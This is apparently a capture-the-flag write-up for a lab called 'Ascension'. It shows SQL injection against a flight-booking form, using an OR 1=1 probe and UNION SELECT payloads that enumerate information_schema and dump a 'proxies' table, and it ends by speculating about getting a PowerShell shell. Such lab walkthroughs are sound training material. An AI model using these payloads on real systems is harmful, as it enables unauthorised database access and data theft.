# ✈️ Ascension

<figure><img src="../../.gitbook/assets/image (967).png" alt=""><figcaption></figcaption></figure>

We first discover a web page on port 80:

<figure><img src="../../.gitbook/assets/image (968).png" alt=""><figcaption></figcaption></figure>

We discover some possible users:

<figure><img src="../../.gitbook/assets/image (969).png" alt=""><figcaption></figcaption></figure>

```
-Nikolai Belinski
-Tank Dempsey
-Edward Richtofen
-Takeo Masaki
-Fanny Spencer
```

On the "book flight" page we quickly discover the following input that seems vulnerable to SQLi:

<figure><img src="../../.gitbook/assets/image (970).png" alt=""><figcaption></figcaption></figure>

We are able to trigger the following error with a simple **'OR 1=1-- -**

<figure><img src="../../.gitbook/assets/image (971).png" alt=""><figcaption></figcaption></figure>

So maybe we can retrieve some information this way. We follow the path of the SQLI and try to use UNION&#x20;

```
' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -
```

<figure><img src="../../.gitbook/assets/image (972).png" alt=""><figcaption></figcaption></figure>

With the following payload, we are able to retrieve the table names:

```
' UNION SELECT NULL,table_name,NULL,NULL,NULL FROM information_schema.tables--
```

<figure><img src="../../.gitbook/assets/image (973).png" alt=""><figcaption></figcaption></figure>

```
' UNION SELECT NULL,column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='proxies'--
```

So we found the column names for proxies:

<figure><img src="../../.gitbook/assets/image (974).png" alt=""><figcaption></figcaption></figure>

```
' UNION SELECT proxy_id,proxy_name,subsystem_name,NULL,NULL FROM proxies--
```

<figure><img src="../../.gitbook/assets/image (975).png" alt=""><figcaption></figcaption></figure>

So could this mean that a user called svc\_dev can run a cmd and PowerShell? From this information, we could imagine that we need to obtain a shell by executing a PowerShell script via an SQL request?
